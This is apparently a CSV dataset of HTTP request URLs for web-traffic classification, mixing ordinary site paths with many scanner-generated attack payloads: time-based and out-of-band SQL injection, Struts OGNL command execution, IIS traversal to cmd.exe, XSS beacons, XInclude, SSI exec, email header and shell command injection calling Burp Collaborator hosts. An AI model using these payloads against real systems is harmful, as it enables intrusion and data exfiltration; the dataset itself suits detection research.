requestUrl,encoder,mode_is
"/(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'""+(select(0)from(select(sleep(6)))v)+""*//static/js/manifest.3ad1d5771e9b13dbdad2.js",20,0
"/(select(0)from(select(sleep(9)))v)/*'+(select(0)from(select(sleep(9)))v)+'""+(select(0)from(select(sleep(9)))v)+""*//static/js/app.8673862912f22bcced43.js",21,0
"/(select(0)from(select(sleep(9)))v)/*'+(select(0)from(select(sleep(9)))v)+'""+(select(0)from(select(sleep(9)))v)+""*//static/js/vendor.5013bbedf6c0508d32c2.js",22,0
/-/npm/v1/security/audits/quick,23,0
"//${#context['xwork.MethodAccessor.denyMethodExecution']=!(#_memberAccess['allowStaticMethodAccess']=true),(@java.lang.Runtime@getRuntime()).exec('id').waitFor()}.action",24,0
//KCMS/docdown/images/logo.jpg,25,0
//KCMS/docdown/images/pic1.gif,26,0
//KCMS/docdown/js/jquery.cookie.js,27,0
//KCMS/docdown/pubdownload.aspx,28,0
//hdip/program/program_list.action,29,0
//healths/Effects/EffectsEdit.aspx,30,0
//mobile/api/qyapp.vote.php,31,0
//pv.gif,32,0
//xmlrpc.php,33,0
/0806f288-2db5-40d1-bea1-a2d99279e8d2/,34,0
/0da17bb7-5194-45d1-b874-9cc93ec17bdb/,35,0
/1.gif,36,0
/10021/32946.js,37,0
/1801edcb22472db9df2e2ce683277e01,38,0
/1c1435cc-eaa2-4164-aeb1-462f0a7c7dc8/,39,0
/2/1566455553514/upload_block_chunk,40,0
/2/article/information/v26/,41,0
/2010pop.gif,42,0
/2019/img/trace_2014.gif,43,0
/221c8db7-5594-4a0a-be17-6833f9eb58f3/,44,0
/2d97bb3d-2b7a-4147-9b71-9a1864b861ba/,45,0
/3.gif,46,0
/360deskup2m.cab,47,0
/3f1/comment-card.iqiyi.com/views_comment/3.0/long_video_comments,48,0
/3f1/iface2.iqiyi.com/control/3.0/init_proxy,49,0
/3f1/iface2.iqiyi.com/fusion/3.0/common_switch,50,0
/3gmusic/fcgi-bin/imusic_tj,51,0
/3k372kws.asp,52,0
/3k372kws.idc,53,0
/404.html,54,0
/4a9c2b55ff9ab347f0bc8d84fc8069e5,55,0
/4o8CGtZz');select pg_sleep(9); -- /js/manifest.3ad1d5771e9b13dbdad2.js,56,0
/631427,57,0
/6f8b8c89-4a5a-48ff-b785-f7994c516c67/,58,0
/811529bf6092a7ccf6abf0f72f841b6e,59,0
/84oSdTum2Q5BphGlnYG/timg,60,0
/93f91c5c-1c5f-46d0-8143-cb231e5b9db7/,61,0
"/<IMG SRC=""javascript:alert(cross_site_scripting.nasl);"">",62,0
"/<IMG SRC=""javascript:alert(cross_site_scripting.nasl);"">.cfm",63,0
"/<IMG SRC=""javascript:alert(cross_site_scripting.nasl);"">.dll",64,0
"/<IMG SRC=""javascript:alert(cross_site_scripting.nasl);"">.exe",65,0
"/<IMG SRC=""javascript:alert(cross_site_scripting.nasl);"">.fts",66,0
"/<IMG SRC=""javascript:alert(cross_site_scripting.nasl);"">.idc",67,0
"/<IMG SRC=""javascript:alert(cross_site_scripting.nasl);"">.jsp",68,0
"/<IMG SRC=""javascript:alert(cross_site_scripting.nasl);"">.mscgi",69,0
"/<ltc xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://aq4eyurdp4csirg9djjxxed09rfl3krlfi28qx.burpcollaborator.net/foo""/></ltc>/employee",70,0
/<script>cross_site_scripting.nasl</script>,71,0
/<script>cross_site_scripting.nasl</script>.aspx,72,0
/<script>cross_site_scripting.nasl</script>.htm,73,0
/<script>cross_site_scripting.nasl</script>.html,74,0
/<script>cross_site_scripting.nasl</script>.jsp,75,0
/<script>cross_site_scripting.nasl</script>.jspa,76,0
/<script>cross_site_scripting.nasl</script>.pl,77,0
/<script>cross_site_scripting.nasl</script>.x,78,0
"/<script>document.cookie=""testaekd=572;""</script>",79,0
"/<syx xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://aq4z6d4bas4dw8qpmx600lke056yuoip6gy3ord.burpcollaborator.net/foo""/></syx>",80,0
"/<trs xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://1wy54lx4vvijoim0japo35jrfilc92x3l08qwf.burpcollaborator.net/foo""/></trs>/js/64.0aaf0a165a749f9c1032.js",81,0
"/<zru xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://e8nigy9h78uw0vydvn11fiv4rvxpli9jxgk68v.burpcollaborator.net/foo""/></zru>/project/view",82,0
/APS/r,83,0
/AdServer/showbaidu,84,0
/Analytics/CounterLink.aspx,85,0
/Broadcast/displayNewsPic.aspx,86,0
/Bulletin/BusinessView.aspx,87,0
/Bulletin/DocmentDownload.aspx,88,0
/Bulletin/PolicyList.aspx,89,0
/Bulletin/QAList.aspx,90,0
/Business/OfflineDownload.aspx,91,0
/CFIDE/wizards/common/_logintowizard.cfm,92,0
/CSCOnm/servlet/login/login.jsp,93,0
/CheckImg.aspx,94,0
/CommonRecommend.png,95,0
/Conf/jsp/systembulletin/bulletinAction.do,96,0
/ConstData.svc/(select load_file('\\\\a3edcqqjwvifjvo6jinnxinj4aa0yr0fr7ex2m.burpcollaborator.net\\mlt')),97,0
/ConstData.svc/GetConstData,98,0
"/ConstData.svc/GetConstData""|echo n54kg770oz 0bda2gecvi ||",99,0
"/ConstData.svc/GetConstData'+(function(){if(typeof susut===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);susut=1;}}())+'",100,0
/ConstData.svc/GetConstData'+(select load_file('\\\\1104ahoaumg6hmmxh9lev9la218rwiz6qydo1d.burpcollaborator.net\\wzz'))+',101,0
/ConstData.svc/GetConstData'+(select*from(select(sleep(20)))a)+',102,0
"/ConstData.svc/GetConstData>
BCC:93accpqiwuiejuo5jhnmxhni49azyrsfj76xum@burpcollaborator.net
xbz: k",103,0
"/ConstData.svc/GetConstData|echo 4306cueodw bw9lrzb8vt||a #' |echo 4306cueodw bw9lrzb8vt||a #|"" |echo 4306cueodw bw9lrzb8vt||a #",104,0
"/ConstData.svc/javascript:/*</script><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\/dm3gvt9mfy1i2y792l6qgl6mndt3hv8jzbm1aq\.burpcollaborator.net/).replace(/\\/g,[]))//'>",105,0
/Default.aspx,106,0
/DroboAccess/enable_user,107,0
/EM_MutiSvcExpandInterface/api/js/get,108,0
/EM_UBG_PositionChangesInterface/api/js,109,0
/EcomResourceServer/adSearchResultNew/adinfo,110,0
/FCKeditoreditor/filemanager/connectors/php/connector.php,111,0
/FE199353505DB489F9D606BFA6BECC52C00000000427754CFC8342CDB9DC019037856DA825e55caff.bin,112,0
/Fckeditor/editor/filemanager/upload/php/upload.php,113,0
/Fckeditoreditor/filemanager/connectors/php/connector.php,114,0
/H4l0/gzrod4v52vfltfxzlg6bx29m/image.png,115,0
/H5Exception/log/upload.do,116,0
/Ho3E0YbF'));select pg_sleep(3); -- /static/js/app.8673862912f22bcced43.js,117,0
/Images/G5/jquery.roll.js,118,0
/Institution/content.asp,119,0
/InterfaceForClient/GetLatestSoftVersion,120,0
/Js/admin/cms_channel.php,121,0
/Js/wls-wsat/CoordinatorPortType,122,0
/KCMS/detail/detail.aspx,123,0
/KDoc/doc.aspx,124,0
/LeaderMail/MailDetail.aspx,125,0
/Loan/index/,126,0
/Login.aspx,127,0
/Login/Log.aspx,128,0
/MGD4MLbn'));select pg_sleep(6); -- /static/js/vendor.5013bbedf6c0508d32c2.js,129,0
/MobileAdServer/getMobileLyricAd.do,130,0
/NKaciuK6');select pg_sleep(9); -- /static/js/manifest.3ad1d5771e9b13dbdad2.js,131,0
/New/SpList.aspx,132,0
/OpenFlashChart/open-flash-chart.swf,133,0
/Poll/Default.aspx,134,0
/PreVirusDetection.php,135,0
/Public/Admin/css/bootstrap/sb-admin-2.css,136,0
/Public/Admin/css/bootstrap/timeline.css,137,0
/Public/js.php,138,0
/Public/static/bootstrap/bower_components/morrisjs/morris.css,139,0
/Public/static/bootstrap/sco/css/sco.message.css,140,0
/Public/static/bootstrap/sco/css/scojs.css,141,0
/Public/static/bootstrap/sco/js/sco.ajax.js,142,0
/Public/static/bootstrap/sco/js/sco.collapse.js,143,0
/Public/static/bootstrap/sco/js/sco.countdown.js,144,0
/Public/static/bootstrap/sco/js/sco.valid.js,145,0
/Public/static/widget-modules/main.js,146,0
/RMApplicationList/reportRMApplicationList,147,0
/ReportingWebService/ReportingWebService.asmx,148,0
/SEJvxOP3'));select pg_sleep(6); -- /static/js/app.8673862912f22bcced43.js,149,0
/Search.asp,150,0
/SecurityCopyJob/log,151,0
/SogouServlet,152,0
/U9/erp/display.aspx,153,0
/U9/erp/simple.aspx,154,0
/U9/ufsoft/simple.aspx,155,0
/User/job/lib/AP_Resume_Intention.asp,156,0
/User/job/lib/AP_Resume_Position.asp,157,0
/User/job/lib/AP_Resume_workcity.asp,158,0
/ViewSource/ProExamineView.aspx,159,0
/ViewSource/SrcFormList.aspx,160,0
/ViewSource/SrcNotice.aspx,161,0
/ViewSource/SrcPrintList.aspx,162,0
/ViewSource/SrcWorkProgram.aspx,163,0
/Websense/cgi-bin/WsCgiLogin.exe,164,0
/XDCcvaZT'));select pg_sleep(6); -- /js/vendor.5013bbedf6c0508d32c2.js,165,0
/_layouts/scriptresx.ashx,166,0
/_mem_bin/..%5c..%5c..%5c..%5c..%5c/winnt/system32/cmd.exe,167,0
/_mem_bin/..%5c/..%5c/..%5c/winnt/system32/cmd.exe,168,0
"/_tools/jquery/focus/slideBox/""><script>alert(35172)</script>",169,0
"/_tools/jquery/focus/slideBox//""><script>alert(35172)</script>",170,0
/_urn:schemas-upnp-org:service:AVTransport_control,171,0
/_vti_bin/..%5c..%5c..%5c..%5c..%5c/winnt/system32/cmd.exe,172,0
/_vti_bin/..%u002f/..%u002f/..%u002f/winnt/system32/cmd.exe,173,0
/_vti_bin/winnt/system32/cmd.exe,174,0
/_vti_cnf/..%5c/..%5c/..%5c/winnt/system32/cmd.exe,175,0
/_vti_cnf/..%u00255c/..%u00255c/..%u00255c/winnt/system32/cmd.exe,176,0
/a,177,0
/a/3/,178,0
/a_19rrhc04u9.html,179,0
/ac18crw0.aspx,180,0
/ac18crw0.cfc,181,0
/ac18crw0.cfm,182,0
/ac18crw0.cgi,183,0
/ac18crw0.exe,184,0
/ac18crw0.html,185,0
/ac18crw0.idc,186,0
/ac18crw0.jsp,187,0
/ac18crw0.jspa,188,0
/ac18crw0.kspx,189,0
/ac18crw0.nsf,190,0
/ac18crw0.php,191,0
/ac18crw0.pl,192,0
/ac18crw0.x,193,0
/acac787f86795396cba127efdb6a7d3f,194,0
/access.php,195,0
/ad/data2/print,196,0
/ad/show_1.html,197,0
/adStat,198,0
/admin.cgi,199,0
/admin/cms_channel.php,200,0
/admin/phpThumb/phpThumb.php,201,0
/admin/scripts/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php,202,0
/admin/system/cert_request_import_action.php,203,0
/admin/upload/phpThumb.php,204,0
/admin_nyy/Login.asp,205,0
/admin_nyy/admin/cms_channel.php,206,0
/admin_nyy/faq.php,207,0
/ads.php,208,0
/ads2.php,209,0
/adstatis.php,210,0
/adv/producer/sendLogVersion2,211,0
/agent/getCompany,212,0
/agent/openDisplay.do,213,0
/ajax,214,0
/ajax.php,215,0
/ajax/calculatetree.php,216,0
/ajax/formulaCalculate.php,217,0
/alert(1)/js/63.2a89150f495bc94c9f43.js,218,0
/alert(1)/project/page,219,0
/alert(1)hpb00v/project/view,220,0
/alert(1)iek6js/employee,221,0
/amcharts/amcolumn/amcolumn.swf,222,0
/amcolumn/amcolumn.swf,223,0
/amcolumn/amcolumn/amcolumn.swf,224,0
/amcolumn/examples/amcolumn/amcolumn.swf,225,0
/analytics/async,226,0
/analytics/rqdsync,227,0
/analytics/upload,228,0
/android/v1/impression,229,0
/api,230,0
"/api
BCC:2ps6xmq5owbkhjf1cbipw6cs8jed2cq4jsgf63v@burpcollaborator.net
ujv: f/employee",231,0
"/api
BCC:gj3kr0kjia5ybx9f6pc3qk662x8rwtkld9aw0kp@burpcollaborator.net
azc: y/sendVerifyCode/getVerifyCode",232,0
"/api
BCC:nxor57yqwhj5p4nmkwqa4rkdg4mzapyhr5oseg3@burpcollaborator.net
zsb: z/project/page",233,0
"/api
BCC:o1qs982r0in6t5rnoxub8soek5qzet2lv9swik7@burpcollaborator.net
bqz: q/employee",234,0
"/api
BCC:xrs1zhs0qrdfjehwe6kky1enaeg843svlji68ux@burpcollaborator.net
dtn: x/project/view",235,0
"/api""|echo 50yknal3w2 cusqw2pmvs ||/sendVerifyCode/getVerifyCode",236,0
"/api""|echo 6p9weohivm 6hhmn0egmf ||/project/view",237,0
"/api""|echo 7l50uvo9qn rybfp6stga ||/project/view",238,0
"/api""|echo wk74o4g3w1 4yy6vz836t ||/employee",239,0
"/api""|echo xsth55t4t5 3vmwne97g3 ||/project/view",240,0
"/api""|ping -n 21 127.0.0.1 ||/employee",241,0
"/api""|ping -n 21 127.0.0.1 ||/project/page",242,0
"/api""|ping -n 21 127.0.0.1 ||/project/view",243,0
"/api&nslookup -q=cname otls18ursif6l5jngxmb0sgec5iz6vuqin5dt2.burpcollaborator.net.&'\""`0&nslookup -q=cname otls18ursif6l5jngxmb0sgec5iz6vuqin5dt2.burpcollaborator.net.&`'/sendVerifyCode/getVerifyCode",244,0
/api' and (select*from(select(sleep(20)))a)-- /employee,245,0
/api' and (select*from(select(sleep(20)))a)-- /project/view,246,0
/api' and (select*from(select(sleep(20)))a)-- /sendVerifyCode/getVerifyCode,247,0
/api'(select*from(select(sleep(20)))a)'/employee,248,0
/api'(select*from(select(sleep(20)))a)'/project/view,249,0
/api');declare @q varchar(99);set @q='\\7iqbqrjah14pao865gbupb5x1o7ivdj4cs9fz3o.burpcollab'+'orator.net\lve'; exec master.dbo.xp_dirtree @q;-- /project/view,250,0
/api');declare @q varchar(99);set @q='\\fsbj0ztir9exkwiefol2zjf5bwhq5ptgm4jr9fy.burpcollab'+'orator.net\iun'; exec master.dbo.xp_dirtree @q;-- /employee,251,0
/api');declare @q varchar(99);set @q='\\hxil51ykwbjzpyngkqq44lk7gymsasyjr7ouei3.burpcollab'+'orator.net\nvm'; exec master.dbo.xp_dirtree @q;-- /project/view,252,0
/api');declare @q varchar(99);set @q='\\mi8qq6jphg44a38l5vb9pq5c137xvvjmca9xzlo.burpcollab'+'orator.net\nxw'; exec master.dbo.xp_dirtree @q;-- /employee,253,0
"/api'+(function(){if(typeof c452u===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);c452u=1;}}())+'/sendVerifyCode/getVerifyCode",254,0
"/api'+(function(){if(typeof hrrop===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);hrrop=1;}}())+'/employee",255,0
"/api'+(function(){if(typeof i1kis===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);i1kis=1;}}())+'/employee",256,0
"/api'+(function(){if(typeof igmih===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);igmih=1;}}())+'/sendVerifyCode/getVerifyCode",257,0
"/api'+(function(){if(typeof koqmd===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);koqmd=1;}}())+'/project/page",258,0
"/api'+(function(){if(typeof ntt4i===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);ntt4i=1;}}())+'/project/view",259,0
"/api'+(function(){if(typeof ozlne===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);ozlne=1;}}())+'/project/view",260,0
"/api'+(function(){if(typeof svvdw===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);svvdw=1;}}())+'/project/view",261,0
/api'+(select load_file('\\\\nqhry7rqphc5i4gmdwjaxrdd94fy3trku8rvhj6.burpcollaborator.net\\gza'))+'/project/view,262,0
/api'+(select load_file('\\\\oa2si8br9iw6250nxx3bhsxet5zznxboecbz1nq.burpcollaborator.net\\jhk'))+'/employee,263,0
/api'+(select load_file('\\\\pqjty9rspjc7i6godyjcxtdf96f031rsugr3hr6.burpcollaborator.net\\yud'))+'/project/view,264,0
/api'+(select load_file('\\\\ptmt19ussjf7l6jogymc0tgfc6i16ruix6utkh9.burpcollaborator.net\\mah'))+'/project/page,265,0
/api'+(select load_file('\\\\rxsv5byuwlj9p8nqk0qe4vkhg8m2auyl19ywokd.burpcollaborator.net\\stc'))+'/employee,266,0
/api'+(select*from(select(sleep(20)))a)+'/employee,267,0
/api'+(select*from(select(sleep(20)))a)+'/project/view,268,0
/api'+(select*from(select(sleep(20)))a)+'/sendVerifyCode/getVerifyCode,269,0
"/api'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'/employee",270,0
"/api'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'/project/view",271,0
"/api'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'/sendVerifyCode/getVerifyCode",272,0
/api'+sleep(20.to_i)+'/employee,273,0
/api'+sleep(20.to_i)+'/sendVerifyCode/getVerifyCode,274,0
/api'.sleep(20).'/project/view,275,0
/api'.sleep(20).'/sendVerifyCode/getVerifyCode,276,0
/api';declare @q varchar(99);set @q='\\5nt9vpo8mz9nfmd4aegsu9av6mcg0eo5ftcg24r.burpcollab'+'orator.net\enz'; exec master.dbo.xp_dirtree @q;-- /employee,277,0
/api';declare @q varchar(99);set @q='\\9r1dztscq3drjqh8eikwydezaqgk4gs7jvgi66v.burpcollab'+'orator.net\eso'; exec master.dbo.xp_dirtree @q;-- /sendVerifyCode/getVerifyCode,278,0
/api'|echo bmracvm2y5 4ounn1pfml #xzwx/employee,279,0
/api'|echo s6lkw2y3ir vrar35hron #xzwx/employee,280,0
/api'|echo vya13ksjnl b59f8k5rt4 #xzwx/employee,281,0
/api'|ping -c 21 127.0.0.1 #/employee,282,0
/api'|ping -c 21 127.0.0.1 #/project/view,283,0
/api'|ping -c 21 127.0.0.1 #/sendVerifyCode/getVerifyCode,284,0
/api'||(select extractvalue(xmltype('<,285,0
"/api,(select*from(select(sleep(20)))a)/project/view",286,0
"/api,(select*from(select(sleep(20)))a)/sendVerifyCode/getVerifyCode",287,0
/api.php,288,0
"/api/""-->'-->`--><!--#set var=""jsy"" value=""irxmz2slqc""--><!--#set var=""lu0"" value=""ktzo14unse""--><!--#echo var=""jsy""--><!--#echo var=""lu0""--><!--#exec cmd=""nslookup -q=cname 5ek9mpf8dz0n6m441e7sl91vxm3grcf4dsaf13q.burpcollaborator.net"" -->/getVerifyCode",289,0
/api/(select extractvalue(xmltype('<,290,0
"/api/<bpq xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://gzjk700jyalyrxpfmps36km6ixosci0jogb7zw.burpcollaborator.net/foo""/></bpq>/page",291,0
"/api/<hja xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://d0eh8x1gz7mvsuqcnmt07hn3jupodp1qpnce03.burpcollaborator.net/foo""/></hja>/view",292,0
"/api/admin'+(function(){if(typeof ytfsq===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);ytfsq=1;}}())+'/",293,0
/api/admin'.sleep(20).'/,294,0
/api/admin';declare @q varchar(99);set @q='\\hh2wtsknca9n801o4cehglmsnjtbh28q5dv1k.burpcollab'+'orator.net\hbs'; exec master.dbo.xp_dirtree @q;-- /,295,0
/api/admin'|echo nyb6ouerob re2g2afms4 #xzwx/,296,0
/api/admin'|ping -c 21 127.0.0.1 #/,297,0
/api/admin/,298,0
"/api/admin/kaihua""|echo xhrltuv7tf ymcts52ffl ||/",299,0
/api/admin/kaihua'(select*from(select(sleep(20)))a)'/,300,0
/api/admin/kaihua'+(select load_file('\\\\laz0mwdr5e2r14usxg7l9pfwgnmga7dvai06p.burpcollaborator.net\\hig'))+'/,301,0
/api/admin/kaihua'|echo jcvxn3ideu ld0wkeh861 #xzwx/,302,0
/api/admin/kaihua'||(select extractvalue(xmltype('<,303,0
/api/admin/kaihua/,304,0
"/api/admin/kaihua/'""><svg/onload=(new(Image)).src='//o7w3jzau2hzuy7rvuj4o6sczdqjk7cx0unkb9\56burpcollaborator.net'>/",305,0
/api/admin/kaihua/(select extractvalue(xmltype('<,306,0
/api/admin/kaihua/information');declare @q varchar(99);set @q='\\okc3wznufhcub74v7jhojspzqqwkkbdzam0ap.burpcollab'+'orator.net\spb'; exec master.dbo.xp_dirtree @q;-- /,307,0
"/api/admin/kaihua/information'+(function(){if(typeof mqdis===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);mqdis=1;}}())+'/",308,0
/api/admin/kaihua/information'+(select*from(select(sleep(20)))a)+'/,309,0
/api/admin/kaihua/information'|ping -c 21 127.0.0.1 #/,310,0
/api/admin/kaihua/information/,311,0
"/api/admin/kaihua/information/'""><svg/onload=(new(Image)).src='//bt8q5mwho4lhkudig6qbsfymzd59t1jpahx7lw\56burpcollaborator.net'>",312,0
/api/admin/kaihua/information/getById,313,0
"/api/admin/kaihua/information/getById
BCC:av9p7lygq3ngmtfhi5saue0l1c77vzonff25qu@burpcollaborator.net
tnc: i",314,0
"/api/admin/kaihua/information/getById
BCC:ryt6a21xtkqxpaiylmvrxv324tapyhr5ix5ntc@burpcollaborator.net
wkp: p",315,0
"/api/admin/kaihua/information/getById&nslookup -q=cname r916l2cx4k1x0atywm6r8ve2ftlp9kxbpyfm4.burpcollaborator.net.&'\""`0&nslookup -q=cname r916l2cx4k1x0atywm6r8ve2ftlp9kxbpyfm4.burpcollaborator.net.&`'",316,0
/api/admin/kaihua/information/getById' and (select*from(select(sleep(20)))a)-- ,317,0
/api/admin/kaihua/information/getById');declare @q varchar(99);set @q='\\ivhx7tyoqbnom1fpidsium0t1k7fv6oufm2cq1.burpcollab'+'orator.net\lgh'; exec master.dbo.xp_dirtree @q;-- ,318,0
"/api/admin/kaihua/information/getById'+(function(){if(typeof teez8===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);teez8=1;}}())+'",319,0
/api/admin/kaihua/information/getById'+(select*from(select(sleep(20)))a)+',320,0
"/api/admin/kaihua/information/getById'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'",321,0
/api/admin/kaihua/information/getById'|echo pc63p54h19 utmielp9lb #xzwx,322,0
/api/admin/kaihua/information/getById'|ping -c 21 127.0.0.1 #,323,0
/api/admin/kaihua/information/getById);declare @q varchar(99);set @q='\\s707j3ay2lzyybrzun4s6wc3dujq7hz5qxdn1c.burpcollab'+'orator.net\hpc'; exec master.dbo.xp_dirtree @q;-- ,324,0
"/api/admin/kaihua/information/getById,(select*from(select(sleep(20)))a)",325,0
/api/admin/kaihua/information/getById;declare @q varchar(99);set @q='\\fbuunqel683l2yvmya8fajgqhhndb41sskfa3z.burpcollab'+'orator.net\thr'; exec master.dbo.xp_dirtree @q;-- ,326,0
"/api/admin/kaihua/information/getById|echo joprdf04xc l6zz1h9il3||a #' |echo joprdf04xc l6zz1h9il3||a #|"" |echo joprdf04xc l6zz1h9il3||a #",327,0
"/api/admin/kaihua/information/javascript:/*</script><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\/u1w9d540wnt0sdl1opyu0y657wds1ks8j06quf\.burpcollaborator.net/).replace(/\\/g,[]))//'>",328,0
"/api/admin/kaihua/information|echo xq8ndxb5tg 2kne0tbhli||a #' |echo xq8ndxb5tg 2kne0tbhli||a #|"" |echo xq8ndxb5tg 2kne0tbhli||a #/",329,0
/api/admin/kaihua/information|ping -c 21 127.0.0.1||x/,330,0
"/api/admin/kaihua/inspection""|echo ma8h8iakkv 5fkq9ohx7e ||/",331,0
/api/admin/kaihua/inspection'+(select load_file('\\\\e3itfp6ky7vkuxnlq90e2i8p9gfd346s3ft3i.burpcollaborator.net\\qys'))+'/,332,0
/api/admin/kaihua/inspection'+sleep(20.to_i)+'/,333,0
/api/admin/kaihua/inspection'|echo j9rpt6z4zt rqm3n292yh #xzwx/,334,0
/api/admin/kaihua/inspection'|ping -c 21 127.0.0.1 #/,335,0
/api/admin/kaihua/inspection/,336,0
/api/admin/kaihua/inspection/(select extractvalue(xmltype('<,337,0
"/api/admin/kaihua/inspection/<loz xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://244hgd78zvw8vlo9rx12369da4g243sukha5z.burpcollaborator.net/foo""/></loz>",338,0
"/api/admin/kaihua/inspection/javascript:/*</script><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\/b9lqlmch441h0utiw66b8femfdlb930rrje92y\.burpcollaborator.net/).replace(/\\/g,[]))//'>",339,0
"/api/admin/kaihua/inspection/javascript:/*</script><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\/dctsoofj764j3wwkz89dbhhoifoec63uumhc51\.burpcollaborator.net/).replace(/\\/g,[]))//'>",340,0
/api/admin/kaihua/inspection/todoList,341,0
"/api/admin/kaihua/inspection/todoList
BCC:vbaan6e16o312ev2yq8vazg6hxnwbo4cv4iu6j@burpcollaborator.net
rav: y",342,0
"/api/admin/kaihua/inspection/todoList""|echo 82u72wugmo bnr2f3gcxi ||",343,0
"/api/admin/kaihua/inspection/todoList%}wd0ir'/""<zr58t",344,0
